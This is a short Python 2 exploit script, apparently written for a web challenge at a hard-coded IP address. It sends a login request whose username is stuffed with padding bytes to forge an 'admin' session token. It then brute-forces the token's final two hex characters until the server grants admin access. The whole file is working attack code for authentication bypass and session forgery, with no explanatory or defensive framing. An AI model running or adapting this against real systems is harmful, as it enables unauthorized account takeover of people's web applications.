#!/usr/bin/python
# coding:utf-8 


import requests

def login():
    url = "http://117.34.111.15:88/index.php?action=login"
    data = "user=wonderkun%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%98%00%00%00%00%00%00%00tadmin|1|fe46d7d8924ec23d69f8d01432de41aa&pwd=1"
    header = {
        "Content-Type":"application/x-www-form-urlencoded"
    }
    
    res = requests.post(url,data=data,allow_redirects=False,proxies={"http":"127.0.0.1:8080"},headers=header)
    return res.cookies['token'][:190]
def getAdminToken(token):
    randstr="0123456789abcdef"
    for i in randstr:
        for j in randstr:
            # token = token+i+j
            url="http://117.34.111.15:88/index.php?action=home"
            headers = {
                'Cookie':'sign='+'fe46d7d8924ec23d69f8d01432de41aa'+';'+'token='+token+i+j
            }                    
            # print url
            proxy = {"http":"127.0.0.1:8080"}
            res=requests.get(url,headers=headers,proxies=proxy)
            if "User" in res.text:
                print "[*] Cookie:",headers['Cookie']
                return
            else:
                print  "[*] failed"
                # print res.text

if __name__ == "__main__":
    tokenPre=login()
    print tokenPre
    getAdminToken(tokenPre)

